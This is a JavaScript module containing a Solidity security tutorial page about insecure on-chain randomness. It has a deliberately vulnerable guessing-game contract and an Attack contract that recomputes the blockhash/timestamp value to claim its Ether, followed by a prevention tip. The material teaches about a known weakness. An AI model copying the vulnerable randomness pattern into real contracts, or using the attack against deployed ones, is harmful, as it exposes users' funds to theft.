// metadata
export const version = "0.8.20"
export const title = "Source of Randomness"
export const description =
    "Blockchain is not a reliable source of randomness in Solidity"

export const keywords = [
    "hack",
    "security",
    "source",
    "random",
    "randomness",
    "blockhash",
    "block",
    "timestamp",
]

export const codes = [
    {
        fileName: "Randomness.sol",
        code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yMDsKCi8qCk5PVEU6IGNhbm5vdCB1c2UgYmxvY2toYXNoIGluIFJlbWl4IHNvIHVzZSBnYW5hY2hlLWNsaQoKbnBtIGkgLWcgZ2FuYWNoZS1jbGkKZ2FuYWNoZS1jbGkKSW4gcmVtaXggc3dpdGNoIGVudmlyb25tZW50IHRvIFdlYjMgcHJvdmlkZXIKKi8KCi8qCkd1ZXNzVGhlUmFuZG9tTnVtYmVyIGlzIGEgZ2FtZSB3aGVyZSB5b3Ugd2luIDEgRXRoZXIgaWYgeW91IGNhbiBndWVzcyB0aGUKcHNldWRvIHJhbmRvbSBudW1iZXIgZ2VuZXJhdGVkIGZyb20gYmxvY2sgaGFzaCBhbmQgdGltZXN0YW1wLgoKQXQgZmlyc3QgZ2xhbmNlLCBpdCBzZWVtcyBpbXBvc3NpYmxlIHRvIGd1ZXNzIHRoZSBjb3JyZWN0IG51bWJlci4KQnV0IGxldCdzIHNlZSBob3cgZWFzeSBpdCBpcyB3aW4uCgoxLiBBbGljZSBkZXBsb3lzIEd1ZXNzVGhlUmFuZG9tTnVtYmVyIHdpdGggMSBFdGhlcgoyLiBFdmUgZGVwbG95cyBBdHRhY2sKMy4gRXZlIGNhbGxzIEF0dGFjay5hdHRhY2soKSBhbmQgd2lucyAxIEV0aGVyCgpXaGF0IGhhcHBlbmVkPwpBdHRhY2sgY29tcHV0ZWQgdGhlIGNvcnJlY3QgYW5zd2VyIGJ5IHNpbXBseSBjb3B5aW5nIHRoZSBjb2RlIHRoYXQgY29tcHV0ZXMgdGhlIHJhbmRvbSBudW1iZXIuCiovCgpjb250cmFjdCBHdWVzc1RoZVJhbmRvbU51bWJlciB7CiAgICBjb25zdHJ1Y3RvcigpIHBheWFibGUge30KCiAgICBmdW5jdGlvbiBndWVzcyh1aW50IF9ndWVzcykgcHVibGljIHsKICAgICAgICB1aW50IGFuc3dlciA9IHVpbnQoCiAgICAgICAgICAgIGtlY2NhazI1NihhYmkuZW5jb2RlUGFja2VkKGJsb2NraGFzaChibG9jay5udW1iZXIgLSAxKSwgYmxvY2sudGltZXN0YW1wKSkKICAgICAgICApOwoKICAgICAgICBpZiAoX2d1ZXNzID09IGFuc3dlcikgewogICAgICAgICAgICAoYm9vbCBzZW50LCApID0gbXNnLnNlbmRlci5jYWxse3ZhbHVlOiAxIGV0aGVyfSgiIik7CiAgICAgICAgICAgIHJlcXVpcmUoc2VudCwgIkZhaWxlZCB0byBzZW5kIEV0aGVyIik7CiAgICAgICAgfQogICAgfQp9Cgpjb250cmFjdCBBdHRhY2sgewogICAgcmVjZWl2ZSgpIGV4dGVybmFsIHBheWFibGUge30KCiAgICBmdW5jdGlvbiBhdHRhY2soR3Vlc3NUaGVSYW5kb21OdW1iZXIgZ3Vlc3NUaGVSYW5kb21OdW1iZXIpIHB1YmxpYyB7CiAgICAgICAgdWludCBhbnN3ZXIgPSB1aW50KAogICAgICAgICAgICBrZWNjYWsyNTYoYWJpLmVuY29kZVBhY2tlZChibG9ja2hhc2goYmxvY2subnVtYmVyIC0gMSksIGJsb2NrLnRpbWVzdGFtcCkpCiAgICAgICAgKTsKCiAgICAgICAgZ3Vlc3NUaGVSYW5kb21OdW1iZXIuZ3Vlc3MoYW5zd2VyKTsKICAgIH0KCiAgICAvLyBIZWxwZXIgZnVuY3Rpb24gdG8gY2hlY2sgYmFsYW5jZQogICAgZnVuY3Rpb24gZ2V0QmFsYW5jZSgpIHB1YmxpYyB2aWV3IHJldHVybnMgKHVpbnQpIHsKICAgICAgICByZXR1cm4gYWRkcmVzcyh0aGlzKS5iYWxhbmNlOwogICAgfQp9Cg==",
    },
]

const html = `<h3>Vulnerability</h3>
<p><code>blockhash</code> and <code>block.timestamp</code> are not reliable sources for randomness.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.20;</span>

<span class="hljs-comment">/*
<span class="hljs-doctag">NOTE:</span> cannot use blockhash in Remix so use ganache-cli

npm i -g ganache-cli
ganache-cli
In remix switch environment to Web3 provider
*/</span>

<span class="hljs-comment">/*
GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
pseudo random number generated from block hash and timestamp.

At first glance, it seems impossible to guess the correct number.
But let&#x27;s see how easy it is win.

1. Alice deploys GuessTheRandomNumber with 1 Ether
2. Eve deploys Attack
3. Eve calls Attack.attack() and wins 1 Ether

What happened?
Attack computed the correct answer by simply copying the code that computes the random number.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">GuessTheRandomNumber</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">guess</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _guess</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-keyword">uint</span> answer <span class="hljs-operator">=</span> <span class="hljs-keyword">uint</span>(
            <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-built_in">blockhash</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">number</span> <span class="hljs-operator">-</span> <span class="hljs-number">1</span>), <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>))
        );

        <span class="hljs-keyword">if</span> (_guess <span class="hljs-operator">=</span><span class="hljs-operator">=</span> answer) {
            (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}(<span class="hljs-string">""</span>);
            <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
        }
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">receive</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params">GuessTheRandomNumber guessTheRandomNumber</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-keyword">uint</span> answer <span class="hljs-operator">=</span> <span class="hljs-keyword">uint</span>(
            <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-built_in">blockhash</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">number</span> <span class="hljs-operator">-</span> <span class="hljs-number">1</span>), <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>))
        );

        guessTheRandomNumber.guess(answer);
    }

    <span class="hljs-comment">// Helper function to check balance</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}
</code></pre><h3>Preventative Techniques</h3>
<ul>
<li>Don&#39;t use <code>blockhash</code> and <code>block.timestamp</code> as source of randomness</li>
</ul>
`

export default html
